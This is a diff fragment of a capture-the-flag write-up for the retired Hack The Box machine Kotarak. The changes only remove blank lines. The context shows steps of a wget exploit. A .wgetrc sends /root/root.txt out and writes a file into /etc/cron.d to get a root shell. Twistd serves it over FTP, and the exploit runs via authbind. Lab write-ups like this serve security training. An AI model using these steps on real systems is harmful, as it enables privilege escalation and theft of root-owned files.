@@ -658,10 +658,8 @@ Send the exploit file to the target
 Create .wgetrc containing the following...make sure its in the folder to be served by Twistd ftp server.
 
 ```
-
 post_file = /root/root.txt
 output_document = /etc/cron.d/wget-root-shell
-
 ```
 
 
@@ -669,7 +667,6 @@ Start the ftp server:
 
 ```
 twistd -n ftp -p 21 -r /root/HTB/retired/kotarak/
-
 ```
 
 
@@ -677,9 +674,7 @@ Run the exploit - we need to use authbind to successfully run this or it will fa
 1024, so it requires elevated privs.
 
 ```
-
 authbind python exploit-wget.py
-
 ```
 
 
